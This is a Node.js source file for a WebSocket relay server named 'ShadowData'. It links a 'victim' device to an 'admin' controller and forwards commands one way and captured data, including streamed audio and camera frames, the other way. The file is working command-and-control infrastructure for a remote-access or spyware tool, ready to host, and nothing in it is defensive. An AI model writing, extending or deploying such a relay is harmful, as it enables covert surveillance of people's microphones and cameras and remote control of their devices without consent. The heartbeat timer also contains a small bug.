const express = require('express');
const { WebSocketServer, WebSocket } = require('ws');
const http = require('http');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

let victimSocket = null;
let adminSocket = null;

app.get('/', (req, res) => {
    res.send(`ShadowData Relay Server Active.<br>Victim Connected: ${!!victimSocket}<br>Admin Connected: ${!!adminSocket}`);
});

// Heartbeat interval to keep Render WebSocket connections alive
const interval = setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.isAlive === false) return ws.terminate();
        ws.isAlive = false;
        ws.ping();
    }, 30000);
});

wss.on('connection', (ws, req) => {
    ws.isAlive = true;
    ws.on('pong', () => { ws.isAlive = true; });

    const urlParams = new URLSearchParams(req.url.split('?')[1]);
    const role = urlParams.get('role');

    if (role === 'victim') {
        if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
            victimSocket.terminate(); // Terminate previous stale victim connection if any
        }
        victimSocket = ws;
        console.log('>>> Victim connected successfully.');
    } else if (role === 'admin') {
        if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
            adminSocket.terminate(); // Terminate previous stale admin connection if any
        }
        adminSocket = ws;
        console.log('>>> Admin connected successfully.');
    }

    ws.on('message', (message) => {
        const isBinary = Buffer.isBuffer(message);
        const logContent = isBinary ? `[Binary/Frame Buffer: ${message.length} bytes]` : message.toString();
        
        // Avoid spamming logs with continuous audio/camera frame chunks
        if (!logContent.startsWith('AUDIO_FRAME:') && !logContent.startsWith('CAMERA_FRAME:')) {
            console.log(`Received message from [${role}]: ${logContent.substring(0, 100)}...`);
        }

        if (role === 'admin') {
            if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
                victimSocket.send(message);
            } else {
                console.log('-> ROUTING FAILED: Victim socket is null or not OPEN.');
                if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
                    adminSocket.send(JSON.stringify({ error: "Victim device is offline or disconnected." }));
                }
            }
        } else if (role === 'victim') {
            if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
                adminSocket.send(message);
            } else {
                // Admin not connected, drop silently to avoid memory buildup
            }
        }
    });

    ws.on('close', () => {
        if (ws === victimSocket) {
            victimSocket = null;
            console.log('XXX Victim disconnected.');
        }
        if (ws === adminSocket) {
            adminSocket = null;
            console.log('XXX Admin disconnected.');
        }
    });

    ws.on('error', (err) => {
        console.error(`WebSocket error on [${role}]:`, err.message);
    });
});

server.on('close', () => {
    clearInterval(interval);
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server listening on port ${PORT}`);
});
